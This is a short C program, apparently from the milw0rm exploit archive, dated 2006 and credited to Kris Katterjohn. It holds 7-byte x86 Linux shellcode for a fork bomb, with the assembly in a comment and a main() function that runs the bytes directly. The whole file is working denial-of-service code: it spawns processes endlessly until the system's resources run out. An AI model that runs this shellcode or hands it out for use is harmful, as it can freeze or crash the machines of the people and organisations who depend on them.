/* By Kris Katterjohn 8/29/2006
 *
 * 7 byte shellcode for a forkbomb
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *      push byte 2
 *      pop eax
 *      int 0x80
 *      jmp short _start
 */

main()
{
       char shellcode[] = "\x6a\x02\x58\xcd\x80\xeb\xf9";

       (*(void (*)()) shellcode)();
}

// milw0rm.com [2006-11-17]